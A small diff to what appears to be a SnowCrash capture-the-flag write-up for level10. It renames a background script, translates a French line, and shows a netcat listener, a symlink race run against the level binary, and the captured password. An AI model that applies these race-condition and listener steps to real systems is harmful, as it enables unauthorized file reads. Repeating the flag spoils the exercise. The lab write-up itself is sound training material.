@@ -40,11 +40,11 @@ level10@SnowCrash:~$ nc -kl 6969
 
 Terminal 2:
 We create a script (cf script.sh) in /var/crash with +x rights
-/var/crash/plop.sh &  // run in background
+/var/crash/script.sh &  // run in background
 ./level10 /tmp/link 127.0.0.1
 
 
-→ dans terminal 1:
+→ in terminal 1:
 .*( )*.
 woupa2yuojeeaaed06riuj63c
 
